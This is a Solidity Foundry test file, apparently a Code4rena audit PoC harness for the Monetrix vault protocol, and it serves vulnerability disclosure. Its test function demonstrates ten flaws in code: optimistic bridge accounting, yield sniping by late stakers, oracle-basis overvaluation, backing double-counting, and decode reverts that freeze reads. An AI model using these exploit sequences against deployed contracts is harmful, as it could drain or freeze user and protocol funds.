// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

// In-scope tokens
import {USDM} from "../../src/tokens/USDM.sol";
import {sUSDM} from "../../src/tokens/sUSDM.sol";
import {sUSDMEscrow} from "../../src/tokens/sUSDMEscrow.sol";

// In-scope core
import {MonetrixVault} from "../../src/core/MonetrixVault.sol";
import {MonetrixAccountant} from "../../src/core/MonetrixAccountant.sol";
import {MonetrixConfig} from "../../src/core/MonetrixConfig.sol";
import {PrecompileReader} from "../../src/core/PrecompileReader.sol";
import {RedeemEscrow} from "../../src/core/RedeemEscrow.sol";
import {YieldEscrow} from "../../src/core/YieldEscrow.sol";
import {InsuranceFund} from "../../src/core/InsuranceFund.sol";

// In-scope governance
import {MonetrixAccessController} from "../../src/governance/MonetrixAccessController.sol";

// In-scope constants
import {HyperCoreConstants} from "../../src/interfaces/HyperCoreConstants.sol";

// Shared test mocks
import {MockUSDC} from "../mocks/MockUSDC.sol";
import {MockCoreDepositWallet} from "../mocks/MockCoreDepositWallet.sol";

/// @dev No-op CoreWriter. Any `sendRawAction` call is accepted silently so PoCs
///      exercising Operator paths (hedge/bridge/HLP/BLP) don't revert at the
///      HyperCore boundary.
contract _PoCMockCoreWriter {
    event ActionSent(bytes action);

    function sendRawAction(bytes calldata action) external {
        emit ActionSent(action);
    }
}

/// @dev Controllable mock for every HyperCore read-precompile (0x0800..0x0811).
///      Defaults to 128 zero bytes so Accountant's fail-closed decoders treat
///      unmocked slots as "no position / zero balance". Override per-slot from
///      your PoC via `setResponse(key, value)`.
contract _PoCMockPrecompile {
    mapping(bytes32 => bytes) public responses;

    function setResponse(bytes calldata callData, bytes calldata response) external {
        responses[keccak256(callData)] = response;
    }

    fallback(bytes calldata data) external payable returns (bytes memory) {
        bytes memory r = responses[keccak256(data)];
        if (r.length == 0) return new bytes(128);
        return r;
    }
}

/// @title  C4Submission — PoC template for Code4rena wardens
/// @notice Every High/Medium submission must be demonstrated inside
///         `test_submissionValidity`. `setUp()` deploys the full Monetrix
///         protocol (all in-scope contracts behind ERC-1967 UUPS proxies),
///         wires roles, mocks HyperCore precompiles + CoreWriter, and funds
///         two test users with 1M USDC each.
///
///         How to submit:
///           1. **Do not copy this file.** Edit it in place.
///           2. Write your exploit inside the body of `test_submissionValidity`.
///              Use the provided helpers (`_deposit`, `_stake`, `_requestRedeem`,
///              `_mockVaultL1SpotUsdc`, `_mockVaultL1SuppliedUsdc`).
///           3. Leave `setUp()` alone unless your finding genuinely requires
///              different initial state. If you must change it, restrict the
///              edits to the minimum needed and document why in a comment.
///           4. Run `forge test --match-path "test/c4/C4Submission.t.sol" -vvv`
///              and confirm `test_submissionValidity` passes (i.e. your PoC
///              terminates in the expected faulty state).
contract C4Submission is Test {
    // ─── In-scope contracts ─────────────────────────────────────
    MonetrixAccessController public acl;
    USDM public usdm;
    sUSDM public susdm;
    sUSDMEscrow public unstakeEscrow;
    InsuranceFund public insurance;
    MonetrixConfig public config;
    MonetrixVault public vault;
    MonetrixAccountant public accountant;
    RedeemEscrow public redeemEscrow;
    YieldEscrow public yieldEscrow;

    // ─── Test doubles ───────────────────────────────────────────
    MockUSDC public usdc;
    MockCoreDepositWallet public depositWallet;

    // ─── Actors ─────────────────────────────────────────────────
    /// @dev `admin` is DEFAULT_ADMIN + GOVERNOR + GUARDIAN + UPGRADER so every
    ///      privileged setter can be reached via `vm.prank(admin)`.
    address public admin = address(0xAD);
    address public operator = address(0xBB);
    address public foundation = address(0xF0);
    address public user1 = address(0x1);
    address public user2 = address(0x2);

    function setUp() public virtual {
        // ── Mocks (USDC + CoreDepositWallet) ──────────────────
        usdc = new MockUSDC();
        depositWallet = new MockCoreDepositWallet(address(usdc));

        vm.startPrank(admin);

        // ── ACL (bootstrap: admin is the sole DEFAULT_ADMIN) ──
        acl = MonetrixAccessController(
            address(
                new ERC1967Proxy(
                    address(new MonetrixAccessController()),
                    abi.encodeCall(MonetrixAccessController.initialize, (admin))
                )
            )
        );

        // ── USDM ──────────────────────────────────────────────
        usdm = USDM(
            address(new ERC1967Proxy(address(new USDM()), abi.encodeCall(USDM.initialize, (address(acl)))))
        );

        // ── InsuranceFund (USDC-denominated, holds reserves) ──
        insurance = InsuranceFund(
            address(
                new ERC1967Proxy(
                    address(new InsuranceFund()),
                    abi.encodeCall(InsuranceFund.initialize, (address(usdc), address(acl)))
                )
            )
        );

        // ── Config (parameters + insurance/foundation routing) ──
        config = MonetrixConfig(
            address(
                new ERC1967Proxy(
                    address(new MonetrixConfig()),
                    abi.encodeCall(MonetrixConfig.initialize, (address(insurance), foundation, address(acl)))
                )
            )
        );

        // ── sUSDM (ERC-4626 staking wrapper over USDM) ────────
        susdm = sUSDM(
            address(
                new ERC1967Proxy(
                    address(new sUSDM()),
                    abi.encodeCall(sUSDM.initialize, (address(usdm), address(config), address(acl)))
                )
            )
        );

        // ── Vault (user deposit/redeem entrypoint) ────────────
        vault = MonetrixVault(
            address(
                new ERC1967Proxy(
                    address(new MonetrixVault()),
                    abi.encodeCall(
                        MonetrixVault.initialize,
                        (
                            address(usdc),
                            address(usdm),
                            address(susdm),
                            address(config),
                            address(depositWallet),
                            address(acl)
                        )
                    )
                )
            )
        );

        // ── Accountant (backing / settle / yield gates) ───────
        accountant = MonetrixAccountant(
            address(
                new ERC1967Proxy(
                    address(new MonetrixAccountant()),
                    abi.encodeCall(
                        MonetrixAccountant.initialize,
                        (address(vault), address(usdc), address(usdm), address(acl))
                    )
                )
            )
        );

        // ── RedeemEscrow (custody of pending redemption USDC) ─
        redeemEscrow = RedeemEscrow(
            address(
                new ERC1967Proxy(
                    address(new RedeemEscrow()),
                    abi.encodeCall(RedeemEscrow.initialize, (address(usdc), address(vault), address(acl)))
                )
            )
        );

        // ── YieldEscrow (custody of declared yield USDC) ──────
        yieldEscrow = YieldEscrow(
            address(
                new ERC1967Proxy(
                    address(new YieldEscrow()),
                    abi.encodeCall(YieldEscrow.initialize, (address(usdc), address(vault), address(acl)))
                )
            )
        );

        // ── Roles. admin plays Governor/Guardian/Upgrader; operator is distinct. ──
        acl.grantRole(acl.GOVERNOR(), admin);
        acl.grantRole(acl.GUARDIAN(), admin);
        acl.grantRole(acl.OPERATOR(), admin);
        acl.grantRole(acl.OPERATOR(), operator);
        acl.grantRole(acl.UPGRADER(), admin);

        // ── Bind USDM/sUSDM mint/burn authority to the vault ──
        usdm.setVault(address(vault));
        susdm.setVault(address(vault));

        // ── sUSDMEscrow (non-upgradeable custody for the unstake queue) ──
        unstakeEscrow = new sUSDMEscrow(address(usdm), address(susdm));
        susdm.setEscrow(address(unstakeEscrow));

        // ── Wire vault → escrows + accountant, accountant → config ──
        vault.setAccountant(address(accountant));
        vault.setRedeemEscrow(address(redeemEscrow));
        vault.setYieldEscrow(address(yieldEscrow));
        accountant.setConfig(address(config));

        // ── Open Gate 1 of the settle pipeline ────────────────
        accountant.initializeSettlement();

        vm.stopPrank();

        // ── Etch HyperCore precompiles (read paths) ──────────
        //    Every slot the Accountant reads through PrecompileReader is backed
        //    by a fresh _PoCMockPrecompile. Default response is 128 zero bytes.
        //    Override from your PoC via `_MOCK_PRECOMPILE(...).setResponse(...)`.
        vm.etch(HyperCoreConstants.PRECOMPILE_ACCOUNT_MARGIN_SUMMARY, address(new _PoCMockPrecompile()).code);
        vm.etch(HyperCoreConstants.PRECOMPILE_SPOT_BALANCE, address(new _PoCMockPrecompile()).code);
        vm.etch(HyperCoreConstants.PRECOMPILE_ORACLE_PX, address(new _PoCMockPrecompile()).code);
        vm.etch(HyperCoreConstants.PRECOMPILE_VAULT_EQUITY, address(new _PoCMockPrecompile()).code);
        vm.etch(HyperCoreConstants.PRECOMPILE_SUPPLIED_BALANCE, address(new _PoCMockPrecompile()).code);
        vm.etch(HyperCoreConstants.PRECOMPILE_PERP_ASSET_INFO, address(new _PoCMockPrecompile()).code);
        vm.etch(HyperCoreConstants.PRECOMPILE_TOKEN_INFO, address(new _PoCMockPrecompile()).code);
        vm.etch(HyperCoreConstants.PRECOMPILE_POSITION, address(new _PoCMockPrecompile()).code);
        vm.etch(HyperCoreConstants.PRECOMPILE_SPOT_PX, address(new _PoCMockPrecompile()).code);

        // ── Etch CoreWriter (write path) ──────────────────────
        vm.etch(HyperCoreConstants.CORE_WRITER, address(new _PoCMockCoreWriter()).code);

        // ── Fund users with 1M USDC each ─────────────────────
        usdc.mint(user1, 1_000_000e6);
        usdc.mint(user2, 1_000_000e6);
    }

    // ═══════════════════════════════════════════════════════════
    //  Helpers — use inside your PoC to reduce boilerplate.
    // ═══════════════════════════════════════════════════════════

    /// @dev USDC → USDM (1:1 mint via vault.deposit).
    function _deposit(address user, uint256 usdcAmount) internal {
        vm.startPrank(user);
        usdc.approve(address(vault), usdcAmount);
        vault.deposit(usdcAmount);
        vm.stopPrank();
    }

    /// @dev USDM → sUSDM (ERC-4626 stake).
    function _stake(address user, uint256 usdmAmount) internal {
        vm.startPrank(user);
        usdm.approve(address(susdm), usdmAmount);
        susdm.deposit(usdmAmount, user);
        vm.stopPrank();
    }

    /// @dev Queue a redemption request. Returns the request id for later claim.
    function _requestRedeem(address user, uint256 usdmAmount) internal returns (uint256 requestId) {
        vm.startPrank(user);
        usdm.approve(address(vault), usdmAmount);
        requestId = vault.requestRedeem(usdmAmount);
        vm.stopPrank();
    }

    /// @dev Seed the vault's L1 spot USDC balance on the mock 0x801 precompile.
    ///      `l1Amount8dp` is in 8-decimal HL wei (USDC on L1 is 8-dp internally).
    function _mockVaultL1SpotUsdc(uint64 l1Amount8dp) internal {
        _PoCMockPrecompile(payable(HyperCoreConstants.PRECOMPILE_SPOT_BALANCE)).setResponse(
            abi.encode(address(vault), uint64(HyperCoreConstants.USDC_TOKEN_INDEX)),
            abi.encode(l1Amount8dp, uint64(0), uint64(0))
        );
    }

    /// @dev Seed the vault's L1 supplied (Portfolio Margin) USDC balance on 0x811.
    ///      Layout: `(uint64, uint64, uint64, uint64 supplied)` — reader takes
    ///      the 4th slot.
    function _mockVaultL1SuppliedUsdc(uint64 l1Amount8dp) internal {
        _PoCMockPrecompile(payable(HyperCoreConstants.PRECOMPILE_SUPPLIED_BALANCE)).setResponse(
            abi.encode(address(vault), uint64(HyperCoreConstants.USDC_TOKEN_INDEX)),
            abi.encode(uint64(0), uint64(0), uint64(0), l1Amount8dp)
        );
    }

    // ═══════════════════════════════════════════════════════════
    //  YOUR POC GOES HERE.
    //
    //  Do not rename `test_submissionValidity`, do not create a new
    //  test file, and do not modify anything outside this function
    //  body unless `setUp()` genuinely cannot produce the precondition
    //  you need. The judge runs this exact test name to verify your
    //  submission.
    //
    //  The body below is a placeholder that only exercises the default
    //  scaffolding so the test passes out of the box. Replace it with
    //  the steps that trigger your finding; the test should still pass
    //  at the end, with assertions proving the bug.
    // ═══════════════════════════════════════════════════════════

    function test_submissionValidity() public {
        // Baseline sanity: no revert with default mocked precompile responses.
        accountant.totalBackingSigned();

        // PoC #1 (high-impact accounting desync): bridgePrincipalFromL1 decrements
        // outstandingL1Principal optimistically before any verifiable L1 settlement.
        // If SEND_ASSET is accepted but silently dropped upstream, protocol books
        // principal as returned while EVM liquidity never arrives.

        // Build principal on L1 ledger side from user deposit + keeper bridge.
        _deposit(user1, 100_000e6);
        vm.warp(block.timestamp + config.bridgeInterval());
        vm.prank(operator);
        vault.keeperBridge(MonetrixVault.BridgeTarget.Vault);
        emit log_named_uint("PoC1_OLP_before_bridgeBack", vault.outstandingL1Principal());
        assertEq(vault.outstandingL1Principal(), 100_000e6, "OLP should increase on keeper bridge");

        // Create redemption shortfall that needs principal bridged back.
        vm.startPrank(user1);
        usdm.approve(address(vault), 50_000e6);
        vault.requestRedeem(50_000e6);
        vm.stopPrank();
        assertEq(vault.redemptionShortfall(), 50_000e6, "shortfall should match pending redeem");

        // Make the pre-bridge guard pass by reporting enough L1 spot USDC.
        _PoCMockPrecompile(payable(HyperCoreConstants.PRECOMPILE_SPOT_BALANCE)).setResponse(
            abi.encode(address(vault), uint64(HyperCoreConstants.USDC_TOKEN_INDEX)),
            abi.encode(uint64(50_000e6 * 100), uint64(0), uint64(0))
        );

        // CoreWriter in this harness is a no-op acceptor: call succeeds, no L1 transfer occurs.
        vm.prank(operator);
        vault.bridgePrincipalFromL1(50_000e6);

        // OLP is reduced even though no USDC arrived in Vault.
        assertEq(vault.outstandingL1Principal(), 50_000e6, "OLP decremented optimistically");
        assertEq(usdc.balanceOf(address(vault)), 0, "Vault still has no bridged principal");
        emit log_named_uint("PoC1_OLP_after_bridgeBack", vault.outstandingL1Principal());
        emit log_named_uint("PoC1_vaultUSDC_before", 0);
        emit log_named_uint("PoC1_vaultUSDC_after", usdc.balanceOf(address(vault)));

        // Downstream redemption funding is now stuck due to missing liquidity.
        vm.prank(operator);
        vm.expectRevert("nothing to fund");
        vault.fundRedemptions(0);

        // PoC #2 (bridge guard bug): _sendL1Bridge checks `spot.total` but
        // ignores `spot.hold` (locked/not withdrawable). Bridge can pass guard
        // even when effectively zero liquid L1 USDC is available.
        //
        // Build fresh shortfall + OLP.
        _deposit(user2, 100_000e6);
        vm.warp(block.timestamp + config.bridgeInterval());
        vm.prank(operator);
        vault.keeperBridge(MonetrixVault.BridgeTarget.Vault);

        vm.startPrank(user2);
        usdm.approve(address(vault), 40_000e6);
        vault.requestRedeem(40_000e6);
        vm.stopPrank();

        // Mock 0x801 with all funds in hold: total>0, available~0.
        _PoCMockPrecompile(payable(HyperCoreConstants.PRECOMPILE_SPOT_BALANCE)).setResponse(
            abi.encode(address(vault), uint64(HyperCoreConstants.USDC_TOKEN_INDEX)),
            abi.encode(uint64(40_000e6 * 100), uint64(40_000e6 * 100), uint64(0))
        );

        // Current code only checks `total`, so this call succeeds and decrements OLP.
        uint256 olpBeforeHoldIgnored = vault.outstandingL1Principal();
        uint256 vaultBalBefore = usdc.balanceOf(address(vault));
        vm.prank(operator);
        vault.bridgePrincipalFromL1(40_000e6);
        assertEq(usdc.balanceOf(address(vault)), vaultBalBefore, "bridge call does not materialize EVM USDC");
        emit log_named_uint("PoC2_OLP_before", olpBeforeHoldIgnored);
        emit log_named_uint("PoC2_OLP_after", vault.outstandingL1Principal());

        // PoC #3 (high-impact redemption liveness break): principal bridged to
        // multisig cannot be pulled back via normal bridgePrincipalFromL1 path,
        // because _sendL1Bridge only checks Vault's L1 account (address(this)).
        //
        // Enable multisig route and bridge new principal there.
        address multisig = address(0xCAFE);
        vm.startPrank(admin);
        vault.setMultisigVault(multisig);
        vault.setMultisigVaultEnabled(true);
        vm.stopPrank();

        uint256 olpBeforeMultisigBridge = vault.outstandingL1Principal();
        _deposit(user1, 80_000e6);
        vm.warp(block.timestamp + config.bridgeInterval());
        vm.prank(operator);
        vault.keeperBridge(MonetrixVault.BridgeTarget.Multisig);
        assertGt(vault.outstandingL1Principal(), olpBeforeMultisigBridge, "OLP tracks multisig-directed principal too");

        vm.startPrank(user1);
        usdm.approve(address(vault), 30_000e6);
        vault.requestRedeem(30_000e6);
        vm.stopPrank();

        // Simulate the realistic state: USDC exists on multisig L1 account, not vault account.
        _PoCMockPrecompile(payable(HyperCoreConstants.PRECOMPILE_SPOT_BALANCE)).setResponse(
            abi.encode(address(vault), uint64(HyperCoreConstants.USDC_TOKEN_INDEX)),
            abi.encode(uint64(0), uint64(0), uint64(0))
        );
        _PoCMockPrecompile(payable(HyperCoreConstants.PRECOMPILE_SPOT_BALANCE)).setResponse(
            abi.encode(multisig, uint64(HyperCoreConstants.USDC_TOKEN_INDEX)),
            abi.encode(uint64(30_000e6 * 100), uint64(0), uint64(0))
        );

        // Fails despite sufficient principal on multisig, freezing normal redemption unwind.
        emit log_named_uint("PoC3_OLP", vault.outstandingL1Principal());
        vm.prank(operator);
        vm.expectRevert("L1 USDC insufficient (unwind hedge or wait for settlement)");
        vault.bridgePrincipalFromL1(30_000e6);

        // PoC #4 (loss of funds): keeperBridge transfers Vault USDC to the
        // bridge wallet and increments OLP optimistically, without any
        // verifiable L1 settlement receipt. If upstream settlement drops, the
        // EVM funds are already gone while no redeemable L1 principal exists.
        //
        // In this harness, MockCoreDepositWallet is a sink wallet (accepts
        // transferFrom, no L1 credit), reproducing the accounting gap.
        uint256 user2UsdcBefore = usdc.balanceOf(user2);
        uint256 vaultBeforeBridge = usdc.balanceOf(address(vault));
        uint256 sinkBefore = usdc.balanceOf(address(depositWallet));

        _deposit(user2, 60_000e6);
        vm.warp(block.timestamp + config.bridgeInterval());
        uint256 olpBeforeKeeper = vault.outstandingL1Principal();
        vm.prank(operator);
        vault.keeperBridge(MonetrixVault.BridgeTarget.Vault);
        uint256 bridgedOut = vault.outstandingL1Principal() - olpBeforeKeeper;
        assertGt(bridgedOut, 0, "keeperBridge should move principal out");

        // Funds have exited the Vault into bridge wallet.
        assertEq(
            usdc.balanceOf(address(vault)),
            vaultBeforeBridge + 60_000e6 - bridgedOut,
            "vault principal transferred out to bridge wallet"
        );
        assertEq(
            usdc.balanceOf(address(depositWallet)),
            sinkBefore + bridgedOut,
            "bridge wallet received principal"
        );

        // User still holds USDM claims, but unwind cannot source principal from L1.
        vm.startPrank(user2);
        usdm.approve(address(vault), 60_000e6);
        uint256 shortfallBefore = vault.redemptionShortfall();
        vault.requestRedeem(60_000e6);
        vm.stopPrank();
        assertEq(vault.redemptionShortfall(), shortfallBefore + 60_000e6, "shortfall created");

        _PoCMockPrecompile(payable(HyperCoreConstants.PRECOMPILE_SPOT_BALANCE)).setResponse(
            abi.encode(address(vault), uint64(HyperCoreConstants.USDC_TOKEN_INDEX)),
            abi.encode(uint64(0), uint64(0), uint64(0))
        );
        vm.prank(operator);
        vm.expectRevert("L1 USDC insufficient (unwind hedge or wait for settlement)");
        vault.bridgePrincipalFromL1(60_000e6);

        // End-state: user's original USDC has left protocol EVM custody, but
        // redemption remains unfundable.
        assertEq(usdc.balanceOf(user2), user2UsdcBefore - 60_000e6, "user funds committed");
        emit log_named_uint("PoC4_bridgeWallet_before", sinkBefore);
        emit log_named_uint("PoC4_bridgeWallet_after", usdc.balanceOf(address(depositWallet)));
        emit log_named_uint("PoC4_principal_moved", bridgedOut);

        // PoC #5 (loss/liveness via PM accounting mismatch): _sendL1Bridge counts
        // 0x811 supplied USDC as immediately bridgeable liquidity when pmEnabled,
        // but bridge action is spot->spot SEND_ASSET. If spot is empty and funds
        // are supplied, guard can pass and decrement OLP without realizable bridge.
        uint256 olpBeforePmPath = vault.outstandingL1Principal();
        _deposit(user1, 70_000e6);
        vm.warp(block.timestamp + config.bridgeInterval());
        vm.prank(operator);
        vault.keeperBridge(MonetrixVault.BridgeTarget.Vault);
        uint256 bridgedForPmPath = vault.outstandingL1Principal() - olpBeforePmPath;
        assertGt(bridgedForPmPath, 0, "setup must create new OLP");

        vm.startPrank(user1);
        usdm.approve(address(vault), 20_000e6);
        vault.requestRedeem(20_000e6);
        vm.stopPrank();

        vm.prank(admin);
        vault.setPmEnabled(true);

        // No spot liquidity on vault L1 account...
        _PoCMockPrecompile(payable(HyperCoreConstants.PRECOMPILE_SPOT_BALANCE)).setResponse(
            abi.encode(address(vault), uint64(HyperCoreConstants.USDC_TOKEN_INDEX)),
            abi.encode(uint64(0), uint64(0), uint64(0))
        );
        // ...but supplied USDC present on 0x811, so current guard passes.
        _PoCMockPrecompile(payable(HyperCoreConstants.PRECOMPILE_SUPPLIED_BALANCE)).setResponse(
            abi.encode(address(vault), uint64(HyperCoreConstants.USDC_TOKEN_INDEX)),
            abi.encode(uint64(0), uint64(0), uint64(0), uint64(20_000e6 * 100))
        );

        uint256 olpBeforeWithdraw = vault.outstandingL1Principal();
        vm.prank(operator);
        vault.bridgePrincipalFromL1(20_000e6);

        // OLP decremented under a liquidity source that is not spot-bridgeable.
        assertEq(vault.outstandingL1Principal(), olpBeforeWithdraw - 20_000e6, "OLP decremented via supplied-only guard");
        emit log_named_uint("PoC5_OLP_before", olpBeforeWithdraw);
        emit log_named_uint("PoC5_OLP_after", vault.outstandingL1Principal());

        // PoC #6 (liveness freeze): signed negative HLP equity cannot be represented
        // by the uint64 decode path and reverts totalBackingSigned().
        int256 baselineBacking = accountant.totalBackingSigned();
        emit log_named_int("PoC6_baseline_backing", baselineBacking);
        vm.mockCall(
            HyperCoreConstants.PRECOMPILE_VAULT_EQUITY,
            abi.encode(address(vault), HyperCoreConstants.HLP_VAULT),
            abi.encode(int64(-1), uint64(0))
        );
        vm.expectRevert();
        accountant.totalBackingSigned();
        emit log_named_uint("PoC6_expected_revert_caught", 1);

        // Reset HLP response so we can exercise an independent freeze vector below.
        vm.mockCall(
            HyperCoreConstants.PRECOMPILE_VAULT_EQUITY,
            abi.encode(address(vault), HyperCoreConstants.HLP_VAULT),
            abi.encode(uint64(0), uint64(0))
        );

        // PoC #7 (liveness freeze): a listed hedge asset with weiDecimals < szDecimals
        // triggers `TokenMath: invalid decimals`, bricking backing reads.
        vm.prank(admin);
        config.addTradeableAsset(
            MonetrixConfig.TradeableAsset({perpIndex: 11, spotIndex: 77, spotPairAssetId: 10077})
        );
        emit log_named_uint("PoC7_added_perpIndex", 11);
        emit log_named_uint("PoC7_added_spotIndex", 77);
        emit log_named_uint("PoC7_weiDecimals", 6);
        emit log_named_uint("PoC7_szDecimals", 7);

        _PoCMockPrecompile(payable(HyperCoreConstants.PRECOMPILE_SPOT_BALANCE)).setResponse(
            abi.encode(address(vault), uint64(77)),
            abi.encode(uint64(1), uint64(0), uint64(0))
        );
        _PoCMockPrecompile(payable(HyperCoreConstants.PRECOMPILE_ORACLE_PX)).setResponse(
            abi.encode(uint32(11)),
            abi.encode(uint64(1))
        );
        _PoCMockPrecompile(payable(HyperCoreConstants.PRECOMPILE_TOKEN_INFO)).setResponse(
            abi.encode(uint32(77)),
            abi.encode(
                PrecompileReader.TokenInfo({
                    name: "BAD",
                    spots: new uint64[](0),
                    deployerTradingFeeShare: 0,
                    deployer: address(0),
                    evmContract: address(0),
                    szDecimals: 7,
                    weiDecimals: 6,
                    evmExtraWeiDecimals: 0
                })
            )
        );
        _PoCMockPrecompile(payable(HyperCoreConstants.PRECOMPILE_PERP_ASSET_INFO)).setResponse(
            abi.encode(uint32(11)),
            abi.encode(
                PrecompileReader.PerpAssetInfo({
                    coin: "BAD",
                    marginTableId: 0,
                    szDecimals: 7,
                    maxLeverage: 1,
                    onlyIsolated: false
                })
            )
        );
        vm.expectRevert("TokenMath: invalid decimals");
        accountant.totalBackingSigned();
        emit log_named_uint("PoC7_expected_revert_caught", 1);

        // PoC #8 (loss via yield sniping): a last-minute staker can capture
        // already-accrued user yield in YieldEscrow, diluting long-term stakers.
        //
        // Use fresh actors so prior PoCs don't pollute balances.
        address incumbent = address(0x1111);
        address sniper = address(0x2222);
        usdc.mint(incumbent, 200_000e6);
        usdc.mint(sniper, 1_000_000e6);

        // Incumbent staker enters early.
        _deposit(incumbent, 100_000e6);
        _stake(incumbent, 100_000e6);

        // Protocol has accrued yield ready for distribution.
        uint256 totalYield = 10_000e6;
        usdc.mint(address(yieldEscrow), totalYield);
        uint256 userShare = (totalYield * config.userYieldBps()) / 10_000; // default 70%

        // Attacker stakes right before distribution (no stake-side cooldown).
        _deposit(sniper, 900_000e6);
        _stake(sniper, 900_000e6);

        uint256 incumbentAssetsBefore = susdm.convertToAssets(susdm.balanceOf(incumbent));
        uint256 sniperAssetsBefore = susdm.convertToAssets(susdm.balanceOf(sniper));

        vm.prank(operator);
        vault.distributeYield();

        uint256 incumbentAssetsAfter = susdm.convertToAssets(susdm.balanceOf(incumbent));
        uint256 sniperAssetsAfter = susdm.convertToAssets(susdm.balanceOf(sniper));
        uint256 incumbentGain = incumbentAssetsAfter - incumbentAssetsBefore;
        uint256 sniperGain = sniperAssetsAfter - sniperAssetsBefore;

        // Late staker captures most of the user-share despite not bearing accrual duration.
        assertGt(sniperGain, incumbentGain, "late staker should capture dominant yield share");
        assertLt(incumbentGain, userShare / 2, "incumbent receives only diluted fraction of accrued yield");

        // Attacker can realize the captured value after cooldown.
        vm.startPrank(sniper);
        uint256 sniperStake = 900_000e6;
        uint256 unstakeId = susdm.cooldownShares(susdm.balanceOf(sniper));
        vm.warp(block.timestamp + config.unstakeCooldown() + 1);
        susdm.claimUnstake(unstakeId);
        vm.stopPrank();
        assertGt(usdm.balanceOf(sniper), sniperStake, "attacker exits with siphoned yield");
        emit log_named_uint("PoC8_incumbent_gain", incumbentGain);
        emit log_named_uint("PoC8_sniper_gain", sniperGain);

        // PoC #9 (loss via oracle-basis overvaluation): Accountant values spot
        // hedge inventory with perp oracle (0x807), not spot oracle (0x808).
        // Under perp premium, backing is overstated and settle can route real
        // USDC yield that does not economically exist.
        vm.startPrank(admin);
        // Remove prior PoC's intentionally-invalid asset so accounting paths are live.
        config.removeTradeableAsset(11);
        config.addTradeableAsset(
            MonetrixConfig.TradeableAsset({perpIndex: 21, spotIndex: 88, spotPairAssetId: 10088})
        );
        vm.stopPrank();

        // Simulate tiny L1 spot inventory of token 88 on vault account.
        _PoCMockPrecompile(payable(HyperCoreConstants.PRECOMPILE_SPOT_BALANCE)).setResponse(
            abi.encode(address(vault), uint64(88)),
            abi.encode(uint64(50_000_000), uint64(0), uint64(0))
        );
        _PoCMockPrecompile(payable(HyperCoreConstants.PRECOMPILE_TOKEN_INFO)).setResponse(
            abi.encode(uint32(88)),
            abi.encode(
                PrecompileReader.TokenInfo({
                    name: "BASIS",
                    spots: new uint64[](0),
                    deployerTradingFeeShare: 0,
                    deployer: address(0),
                    evmContract: address(0),
                    szDecimals: 6,
                    weiDecimals: 8,
                    evmExtraWeiDecimals: 0
                })
            )
        );
        _PoCMockPrecompile(payable(HyperCoreConstants.PRECOMPILE_PERP_ASSET_INFO)).setResponse(
            abi.encode(uint32(21)),
            abi.encode(
                PrecompileReader.PerpAssetInfo({
                    coin: "BASIS",
                    marginTableId: 0,
                    szDecimals: 6,
                    maxLeverage: 1,
                    onlyIsolated: false
                })
            )
        );

        // Perp marked at $2 while spot should be $1: accountant uses only perp oracle.
        _PoCMockPrecompile(payable(HyperCoreConstants.PRECOMPILE_ORACLE_PX)).setResponse(
            abi.encode(uint32(21)),
            abi.encode(uint64(2_000_000))
        );
        _PoCMockPrecompile(payable(HyperCoreConstants.PRECOMPILE_SPOT_PX)).setResponse(
            abi.encode(uint64(10088)),
            abi.encode(uint64(1_000_000))
        );

        // Provide real vault USDC liquidity so an overstated settle can drain it.
        _deposit(user1, 20_000e6);
        vm.warp(block.timestamp + accountant.minSettlementInterval());

        uint256 foundationBefore = usdc.balanceOf(foundation);
        uint256 insuranceBefore = usdc.balanceOf(address(insurance));
        int256 dsBefore = accountant.distributableSurplus();
        assertGt(dsBefore, 0, "perp-premium mark should create distributable surplus");

        vm.prank(operator);
        vault.settle(1e6); // settle 1 USDC of "yield"
        vm.prank(operator);
        vault.distributeYield();

        // Real USDC is paid out to protocol recipients based on inflated mark.
        assertGt(usdc.balanceOf(foundation), foundationBefore, "foundation received over-distributed USDC");
        assertGt(usdc.balanceOf(address(insurance)), insuranceBefore, "insurance received over-distributed USDC");
        emit log_named_int("PoC9_distributable_surplus", dsBefore);
        emit log_named_uint("PoC9_foundation_before", foundationBefore);
        emit log_named_uint("PoC9_foundation_after", usdc.balanceOf(foundation));

        // PoC #10 (miscalculation -> fund drain): if multisigVault is configured
        // to the same address as vault, Accountant reads the same L1 account
        // twice (vault + multisig paths), double-counting supplied/spot/perp backing.
        //
        // That inflates distributable surplus and allows settle/distribute to route
        // real USDC payouts against phantom backing.
        _deposit(user2, 30_000e6);
        vm.prank(operator);
        vault.supplyToBlp(uint64(HyperCoreConstants.USDC_TOKEN_INDEX), uint64(1)); // registers vault supplied USDC slot
        vm.prank(operator);
        accountant.addMultisigSupplyToken(uint64(HyperCoreConstants.USDC_TOKEN_INDEX)); // registers multisig supplied slot

        // Same account for both reads.
        vm.startPrank(admin);
        vault.setMultisigVault(address(vault));
        vault.setMultisigVaultEnabled(true);
        vm.stopPrank();

        // Report 50k USDC supplied on vault account.
        _PoCMockPrecompile(payable(HyperCoreConstants.PRECOMPILE_SUPPLIED_BALANCE)).setResponse(
            abi.encode(address(vault), uint64(HyperCoreConstants.USDC_TOKEN_INDEX)),
            abi.encode(uint64(0), uint64(0), uint64(0), uint64(50_000e6 * 100))
        );

        int256 backingDoubleCounted = accountant.totalBackingSigned();

        // Disable multisig mirror and re-read; backing should drop by one full
        // supplied leg if double-counting exists.
        vm.startPrank(admin);
        vault.setMultisigVaultEnabled(false);
        vault.setMultisigVault(address(0));
        vm.stopPrank();
        int256 backingSingleCount = accountant.totalBackingSigned();
        assertGt(
            backingDoubleCounted - backingSingleCount,
            int256(40_000e6),
            "same-account multisig should materially inflate backing"
        );

        // Re-enable vulnerable configuration and drain real USDC via settle/distribute.
        vm.startPrank(admin);
        vault.setMultisigVault(address(vault));
        vault.setMultisigVaultEnabled(true);
        vm.stopPrank();

        vm.warp(block.timestamp + accountant.minSettlementInterval());
        uint256 foundationBefore2 = usdc.balanceOf(foundation);
        vm.prank(operator);
        vault.settle(1e6);
        vm.prank(operator);
        vault.distributeYield();
        assertGt(usdc.balanceOf(foundation), foundationBefore2, "foundation receives payout from phantom surplus");
        emit log_named_int("PoC10_backing_doubleCounted", backingDoubleCounted);
        emit log_named_int("PoC10_backing_singleCount", backingSingleCount);
        emit log_named_int("PoC10_delta", backingDoubleCounted - backingSingleCount);

    }
}


